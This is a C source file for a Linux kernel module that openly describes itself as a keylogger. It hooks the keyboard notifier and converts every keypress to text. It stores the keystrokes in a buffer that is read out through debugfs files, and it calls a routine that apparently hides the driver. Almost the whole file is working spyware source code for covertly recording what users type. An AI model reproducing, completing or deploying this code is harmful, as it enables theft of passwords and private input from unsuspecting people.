#include "keylogger.h"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("8xbit");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Just a simple keylogger");
MODULE_SUPPORTED_DEVICE("Not machine dependent");
/*vars for makeing files*/
static struct dentry *file;
static struct dentry *file1;
static struct dentry *subdir;
/*########*/
int ret = 0;
int len;


//corvent the keycode to string 
int keycode_to_string(int key_press, int shift, char* buff)
{
    char* tav;  
    if (shift)
    {
        /*hundle as shift*/
        tav = keycode[key_press][1];
    }
    else
    {
        tav = keycode[key_press][0];
    }
        len = sprintf(buff,tav);
        return len;      
}
//callback function
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    struct keyboard_notifier_param *param =(struct keyboard_notifier_param*) p;
    char keybuffer[12] = {0};

    if (!(param->down))
        return NOTIFY_OK;

    if (code == KBD_KEYCODE)
    {
        len = keycode_to_string(param->value, param->shift, keybuffer) ;  
        if (strlen(keybuffer)> 0 && len)
        {
            printk(KERN_ALERT "notifer type to msg ptr");
            strncpy(msg_Ptr+ buf_pos, keybuffer, len);
            buf_pos+=len;
            
                    
        }

    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger ={.notifier_call = notifier};

//MODULE INIT
int run_keylogger(void)
{
    ret = driver_entry();
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
        return ret;
    }
    else
    {
        printk(KERN_ALERT "Keylogger: load the device driver successfully");
    }
    ret = hide_driver_entery();
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
        return ret;
    }
    else
    {
        printk(KERN_ALERT "Keylogger: load the device driver successfully");
    }
    subdir = debugfs_create_dir("keylogger", NULL);


    if(IS_ERR(subdir))
        return PTR_ERR(subdir);
    else if (!subdir)
        return -ENOENT;
    else
    {
        printk(KERN_ALERT "Keylogger: create debugfs dir");
    }
    
    file = debugfs_create_file("keyloging",0500, subdir, NULL, &fops);
    if (!file)
    {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }
    file1 = debugfs_create_file("hide",0500, subdir, NULL, &fops_hide);
    if (!file1)
    {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }
    
    else
    {
        printk(KERN_ALERT "Keylogger: create debugfs file");

    }
    
    ret= register_keyboard_notifier(&keylogger);
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unable to load the module -> keyboard notifier");
        return ret;
    }

    return ret;

}
//MODULE EXIT
void stop_keylogger(void)
{
   unregister_keyboard_notifier(&keylogger);
    driver_exit();
    debugfs_remove_recursive(subdir);
    printk(KERN_ALERT "Keylogger: unload the module");
} 

;